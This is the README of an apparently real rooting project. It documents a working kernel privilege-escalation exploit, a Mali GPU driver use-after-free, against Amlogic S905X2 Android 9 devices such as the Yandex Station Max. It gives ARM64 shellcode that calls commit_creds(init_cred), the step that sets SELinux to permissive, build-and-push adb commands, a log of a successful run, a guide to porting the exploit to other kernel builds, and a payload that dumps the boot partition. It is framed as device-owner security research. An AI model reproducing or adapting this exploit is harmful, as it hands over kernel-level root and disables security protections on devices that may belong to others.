# yandex-station-2-s905x2-root

Root shell on Amlogic S905X2 Android 9 devices via a local privilege
escalation in the Mali GPU driver.

```
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

A single `read()` of a sysfs node returns a root shell. No firmware
modification, no writes to block devices, no persistent changes. The device
stays up and stable.

This was developed against a Yandex Station Max (YNDX-0008, Amlogic S905X2,
Android 9, kernel `4.9.113-g985a1e6b`), confirmed working end to end. Other
S905X2 devices on the same BSP are likely to work after recomputing the kernel
constants — see [Porting to another kernel](#porting-to-another-kernel).

> **Getting root on a Station Max, step by step:** [docs/root-guide.md](docs/root-guide.md)
> records the procedure as it was actually run — preparation, the port-5555
> state, the single run, what to dump while you have root, and recovery. This
> README is the reference for *why* the exploit works; the guide is *what to
> do*.

---

## Contents

- [docs/root-guide.md](docs/root-guide.md) — the procedure
- [Disclaimer](#disclaimer)
- [What is exploited](#what-is-exploited)
- [Requirements](#requirements)
- [Quick start](#quick-start)
- [Reading the log](#reading-the-log)
- [Design decisions](#design-decisions)
- [Porting to another kernel](#porting-to-another-kernel)
- [Pitfalls that cost runs](#pitfalls-that-cost-runs)
- [Repeat runs and restoring SELinux](#repeat-runs-and-restoring-selinux)
- [Reference output](#reference-output)
- [Layout](#layout)
- [Known defects](#known-defects)
- [Applicability](#applicability)

---

## Disclaimer

For security research and for devices you own or are authorised to test.

This is a known vulnerability in an Amlogic BSP kernel from 2022. The exploit
is a kernel-level local privilege escalation: while the payload is installed, it
overwrites twelve words of kernel text and sets SELinux to permissive. A crash
mid-run can leave the device in a bad state. Read
[Pitfalls](#pitfalls-that-cost-runs) before running it on anything you care
about.

Do not run `quasar-root-kit.tar.gz` or similar kits from third-party devices.
Their constants belong to a different kernel build, and applied blindly to this
one they corrupt kernel text.

---

## What is exploited

A use-after-free in the Mali GPU driver (`kbase`). The driver
hands userspace a `mem_handle` for a page that it continues to use for its own
page tables after freeing. The freed page is reused as a page table for a GPU
address, and through it userspace gains write access to an arbitrary physical
page of kernel memory.

The full chain:

1. `trigger()` creates a JIT region, frees it, and races to preserve the layout
   the driver leaves behind.
2. `find_freed_idx()` finds an index whose backing is genuinely lost.
3. `find_pgd()` finds, among the alias regions, the one that became a page
   table.
4. `write_to(mali_fd, pgd + OVERWRITE_INDEX*8, ...)` rewrites entry
   `OVERWRITE_INDEX` so that it points at a chosen physical page of kernel
   memory.
5. `write_data()` writes through that entry.
6. `cleanup()` restores the entry to its original value.

Steps 4–5 run twice: first to relax SELinux, then to write shellcode into kernel
text that calls `commit_creds(init_cred)`.

Target: Amlogic S905X2, Bifrost GPU `ffe40000.bifrost`, Android 9, build
`PPR1.180610.011.20220415`, `text_base 0xffffff8009080000`,
`KERNEL_BASE = 0x1080000`, KASLR disabled. ADB gives `uid=2000(shell)`, SELinux
enforcing.

---

## Requirements

- An Android NDK (r26d was used; any recent one should do).
- `adb` access to the device, with the device reachable over TCP or USB.
- A device running the matching kernel build, or a kernel image to recompute the
  constants from.

`-static` does not link with this toolchain. `-DSHELL` is mandatory. Only the
`.cmd` wrapper variants of the NDK tools work on Windows.

---

## Quick start

```bash
# build only
python tools/build.py /path/to/android-ndk-r26d

# build, push and run
python tools/build.py /path/to/android-ndk-r26d --device
python tools/build.py /path/to/android-ndk-r26d --device --serial <host>:5555
```

The script checks `uptime` before running, verifies md5 after `push`, and prints
the tail of the log.

The binary is not committed, and its md5 depends on the payload compiled into
it, so there is no single expected value. What the check is for is comparing the
local md5 against the one read back from the device after the push: that is what
catches the silent `push` failure described under [Pitfalls](#pitfalls-that-cost-runs).
The value below belongs to the build that dumps `boot.img` — the payload the
reference run used. A build with a different payload will not match it, and that
is expected:

```
7d59c29b246ec99ce578a095ae0bfa43
```

By hand:

```bash
CC=$NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/armv7a-linux-androideabi21-clang.cmd
cd src && "$CC" -O2 -fPIE -pie -DSHELL -o reader4 reader4.c -ldl

adb connect <host>:5555
adb push reader4 /data/local/tmp/reader4
adb shell "md5sum /data/local/tmp/reader4"     # compare with the local copy
adb shell "chmod 755 /data/local/tmp/reader4"
adb shell "rm -f /data/local/tmp/r4.log; timeout 240 /data/local/tmp/reader4 > /data/local/tmp/r4.log 2>&1; echo RUN_DONE; id; getenforce"
```

---

## Reading the log

A successful run:

```
stage=find_freed_idx
UAF_BACKING_LOSS_OBSERVED freed_idx=0
PGD_CANDIDATE index=23 gpu_va=100c9d000
SELINUX_WRITE_DONE
target_phys=13ec578 entry=13ec443 code=f00096e0 9109a000 90ffe708 91078108
HOOK_ENTRY_SET
HOOK_WRITTEN
trigger_node_open=5
trigger_node_read=174895720
PGD_RESTORED
reexec
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
```

What each line means:

- `freed_idx` — the index whose backing was lost. Varies between runs.
- `PGD_CANDIDATE index=23` — the page that became a page table. It matched
  across runs v42 and v46, but that is not a guarantee.
- `target_phys=13ec578` — the physical page holding the shellcode. Cross-checked
  against `sel_read_checkreqprot` from the kernel symbols.
- `trigger_node_read=174895720` — garbage. The handler's prologue has been
  overwritten, so `simple_read_from_buffer` returns whatever. **This does not
  affect the result**: `commit_creds` has already run by the time the hook
  returns.
- `context=u:r:kernel:s0` — a direct consequence of `init_cred`, whose
  `security` field points at the kernel SID. Nothing else needs to be exploited
  to get it.

`getenforce` **before** writing `1` reports `Permissive`; at the end of the same
command `echo 1 > /sys/fs/selinux/enforce` restores the mode and a second
`getenforce` prints `Enforcing`. Reading only the tail of the log makes it look
as though SELinux was left off — check the final value with a separate command
from the shell.

The lines after `context=` come from the new `sh`. This is intentional; see
[Check root from a new process](#check-root-from-a-new-process).

---

## Design decisions

### The hook is on `sel_read_checkreqprot`, not `avc_denied`

This is the central decision, and it cost several bad runs to find.

`avc_denied` is called from paths that run in kernel tasks.
`commit_creds(init_cred)` there changes the identity of a kthread rather than of
the process, and the next call breaks the system. Run v44 with that hook forced
a reboot, and the `avc_denied` table was left corrupted — after the reboot every
AVC denial globally changed credentials again.

On top of that, the prologue of `avc_denied` is an `.isra` clone taking seven
arguments (`w0..w5`, `x7`), instrumented with ftrace (`bl _mcount`), and saving
`x19..x26`. Shellcode that does not restore that entire frame corrupts registers.

`sel_read_checkreqprot` is an ordinary `read` handler with four arguments
(`file`, `buf`, `size`, `ppos`). It is called only from the read syscall, so it
runs on the stack of the reading process, and root is granted to that process.

### The `handle_unknown` node is not usable

`sel_read_handle_unknown` (`0x36d028`) exists in the kernel image, but the
`handle_unknown` node is not registered in this policy:

```
$ ls /sys/fs/selinux/
access avc booleans checkreqprot class commit_pending_bools context create
deny_unknown disable enforce initial_contexts load member mls null policy
policy_capabilities policyvers reject_unknown relabel status user validatetrans
```

A symbol without a node is unreachable from userspace, so the anchor had to
change to `checkreqprot` (`0x36c578`). **When changing kernel or policy, first
check that a file with the chosen anchor exists at all:**

```bash
adb shell ls /sys/fs/selinux/ | grep -E 'checkreqprot|handle_unknown|enforce'
```

### Shellcode preserves arguments and frame

`root_code[12]` is laid out as:

```c
root_code[0]  = write_adrp(0, sel_read_anchor, init_cred);   // adrp x0, init_cred
root_code[1]  = YNDX_ADD_INIT;                               // add  x0, x0, #0x268
root_code[2]  = write_adrp(8, sel_read_anchor, commit_cred); // adrp x8, commit_creds
root_code[3]  = YNDX_ADD_COMMIT;                             // add  x8, x8, #0x1e0
root_code[4]  = 0xa9bf07e0; // stp x0, x1, [sp, #-0x10]!
root_code[5]  = 0xa9be0fe2; // stp x2, x3, [sp, #-0x20]!
root_code[6]  = 0xa9bd7bfd; // stp x29, x30, [sp, #-0x30]!
root_code[7]  = 0xd63f0100; // blr x8
root_code[8]  = 0xa8c37bfd; // ldp x29, x30, [sp], #0x30
root_code[9]  = 0xa8c20fe2; // ldp x2, x3, [sp], #0x20
root_code[10] = 0xa8c107e0; // ldp x0, x1, [sp], #0x10
root_code[11] = 0xd65f03c0; // ret
```

The first eight words overwrite the start of the handler. `adrp` computes its
page relative to its own position, so the encoded displacement depends on where
it is written — `write_adrp()` computes it, and the result is worth checking
with a round-trip.

After `blr x8` the handler continues with `x0..x3` and `x29/x30` restored and
returns into the original code. That is why reading the node does not crash.

### `cleanup()` runs before anything else

While entry `OVERWRITE_INDEX` points at kernel text, the driver uses it for its
own work. If the process exits without restoring the entry, the table stays
corrupted — this is the destabilisation mechanism from v44. So `cleanup(mali_fd,
pgd)` sits immediately after the node read and before the `execl`.

### Check root from a new process

bionic caches `getuid()` / `geteuid()` when the process starts. Checking inside
the same process that read the node will show nothing. So after `cleanup` the
payload does:

```c
execl("/system/bin/sh", "sh", "-c", "id; getenforce", (char*)NULL);
```

and `id` runs in a new process. That is the proof that the root is real.

---

## Porting to another kernel

The constants in `src/reader4.c` (`YNDX_*`) are tied to one specific build. For
another build, recompute them from its image:

```bash
python tools/extract-offsets.py kernel.elf --nm=/path/to/llvm-nm.exe
python tools/extract-offsets.py kallsyms.txt          # if a symbol dump exists
```

The script prints ready-to-paste `#define`s and the physical addresses for
redirection. The ELF is read through `llvm-nm` rather than a custom parser,
because the `vmlinux-to-elf` converter writes a symbol table whose header does
not follow the spec, and a strict parser finds nothing in it.

Then add a branch for the build fingerprint in `select_offset()` (`src/reader4.c`)
next to the existing one, and call `fixup_root_shell()` with the new values. The
fingerprint is visible with:

```bash
adb shell getprop ro.build.fingerprint
```

Pitfall: `device_tmp/boot_*/root-stub-reference.json` in this build contains
`ADRP_INIT 0xc00096e0` and `ADRP_COMMIT 0xe0ffe6e8`, whereas the correct values
are `0xd00096e0` and `0xf0ffe6e8` — the difference is bit 28 (`immhi`). Do not
trust that file; it is marked unverified. Use `write_adrp()` and a round-trip.

---

## Pitfalls that cost runs

Every item below is an observed failure, not a theory.

- **Do not hook `avc_denied`.** Calls from kernel contexts, `.isra` signature.
  Result: reboot, and a corrupted AVC table afterwards.
- **Do not pass `mali_fd2` to `write_selinux` / `write_data` / `write_shellcode` /
  `reserve_pages`.** Only `mali_fd`. The cross-fd variant (v41) rebooted; a
  single fd (v42, v46) succeeded.
- **Unwind `munmap` only for the current `flush_regions[slot]`.** Unwinding all
  previous slots (v43) causes an SMMU wedge and a reboot, because one of them is
  already a page table.
- **Do not read `alias_regions[freed_idx]` in a loop** (v37 → device offline),
  and **do not scan all `gpu_regions[j]`** (v38 → hang).
- **Do not issue `MEM_SYNC`** for a handle whose entry has been redirected, nor
  **after** `write_to` on a sprayed/freed handle.
- **`type=0` in `MEM_SYNC`** is EINVAL; it does nothing useful.
- **Do not drop `cleanup(mali_fd, pgd)` before `execl`.** Without it the GPU
  table is left pointing at kernel text.
- **Check `uptime` before every run.** The device reboots spontaneously,
  `/data/local/tmp` is wiped, and `r4.log` survives from the previous run. Do
  `rm -f` and the run in one command with the log read.
- **`push` can silently fail** (`error: closed`). Verify with `md5sum`.
- Exit codes: `138` — SIGBUS/SIGSEGV, `1` — `err()`, `255` — the device rebooted
  during the command.
- A hung process (`ps -A -o PID,STAT,WCHAN,NAME | grep reader4` showing `R 0`
  without `PGD_RESTORED`) is cleared with `adb reboot`; after the reboot wait
  70 s, then another 150 s.

Before a run, make sure `uptime` is at least three minutes.

---

## Repeat runs and restoring SELinux

Each run writes `0` to `selinux_enforcing` and mutates twelve words of
`sel_read_checkreqprot`. A repeat run without a reboot is not recommended.

Returning to enforcing **does not require a reboot**: `echo 1` from the obtained
root goes through and takes effect immediately, which is what the payload does
at the end of the command. Verified on this build. A reboot is needed for
something else — to restore the twelve words of kernel text that the run
overwrote.

```bash
echo 1 > /sys/fs/selinux/enforce      # or: setenforce 1
```

The current payload grants root to the process that reads
`/sys/fs/selinux/checkreqprot`, and that same process dumps `boot.img`. To
substitute your own payload, replace the command in `src/reader4.c`:

```c
const char* payload =
  "id; getenforce;"
  "dd if=/dev/block/platform/ffe07000.emmc/by-name/boot"
  " of=/data/local/tmp/boot.img bs=1048576;"
  "chmod 0644 /data/local/tmp/boot.img;"
  "md5sum /data/local/tmp/boot.img;"
  "ls -l /data/local/tmp/boot.img;"
  "echo 1 > /sys/fs/selinux/enforce;"
  "getenforce";
execl("/system/bin/sh", "sh", "-c", payload, (char*)NULL);
```

The partition path is exactly that: `/dev/block/by-name/` does not exist on this
build; `by-name` lives inside the platform directory.

Note the `chmod`. The file produced by `dd` is created `0600` owned by `root`,
and this is not cosmetic: without it, `adb pull` cannot read the copy, because
`adbd` on this build does not run as root. A run where `chmod` is missing or
fails looks successful in the log, but the file stays unreadable. Check
`ls -lZ /data/local/tmp/boot.img` after a push run.

---

## Reference output

The `boot` partition is `mmcblk0p11`, 16384 KB. The copy obtained:

| | |
|---|---|
| file | `dump/boot.img` |
| size | 16777216 bytes |
| md5 | `11e1a2508fd3e7f4a1914c3db49f8099` |
| read time | 0.271 s |

The header parses as a normal `ANDROID!`, version 1:

```
kernel_size    9248768    kernel_addr   0x1080000
ramdisk_size         0    ramdisk_addr  0x1000000
second_size      86016    second_addr   0xf00000
page_size         2048    tags_addr     0x100
header_version       1
os_version    0x12000128   (Android 9)
cmdline  androidboot.dtbo_idx=0 --cmdline otg_device=1 buildvariant=user
```

Two things are worth noting. First, `kernel_addr = 0x1080000` independently
confirms `KERNEL_BASE` from the payload: the constant came from disassembling
the kernel image, and here it is visible in the packed boot partition taken off
the device. Second, `ramdisk_size = 0` — no ramdisk is embedded, as expected for
Amlogic, where the root filesystem is mounted from separate `system`/`vendor`
partitions and the device tree lives in `second` and `dtbo`.

### The kernel inside boot.img is encrypted

The `kernel_size` payload begins with `AMLSECU!` — an Amlogic Secure Boot
container, not an ARM64 `Image`. The data past the header contains neither the
`ARM\x64` signature nor any long compressible stream; without the keys the
contents do not unpack. The build stamp inside the header is `20220415144239`,
i.e. 15 April 2022, the same day as in the build name.

The practical conclusion: **`boot.img` is not usable as a source of kernel
symbols.** `tools/extract-offsets.py` needs an unpacked `Image`, which is
obtained differently. The dumped image is valuable for something else — it
records the exact state of the boot partition on the device, including
`cmdline`, load addresses and `dtbo_idx`, and can be compared against the image
from a firmware package if it ever needs to be shown that the partition was not
modified.

---

## Layout

```
s905x2-root/
├── README.md                  this guide
├── src/
│   ├── reader4.c              payload
│   ├── mali.h                 Mali UAPI headers
│   ├── mali_base_jm_kernel.h  ioctl structure definitions
│   └── midgard.h              Midgard job types
└── tools/
    ├── build.py               build and deploy
    └── extract-offsets.py     extract offsets from a kernel image
```

All three headers are required; `reader4.c` includes all of them.

---

## Known defects

These do not affect obtaining root; recorded for completeness.

- `flags_change failed gpu_va=... flags=20000 mask=0` (`Invalid argument`) —
  `mem_flags_change(mali_fd, jit_addr, BASE_MEM_DONT_NEED, 0)` in `trigger()`.
- `trigger_node_read=174895720` — a garbage return from
  `simple_read_from_buffer` caused by overwriting the handler prologue.
  `commit_creds` has already run by then.
- Compiler warnings at `reader4.c:458` — `printf` format mismatch for `__u64`
  fields.

---

## Applicability

The exploit works on the specific build `PPR1.180610.011.20220415` (kernel
`4.9.113-g985a1e6b-dirty`) with KASLR disabled. A firmware update changes the
kernel build and every constant has to be recomputed —
[Porting to another kernel](#porting-to-another-kernel) describes how.
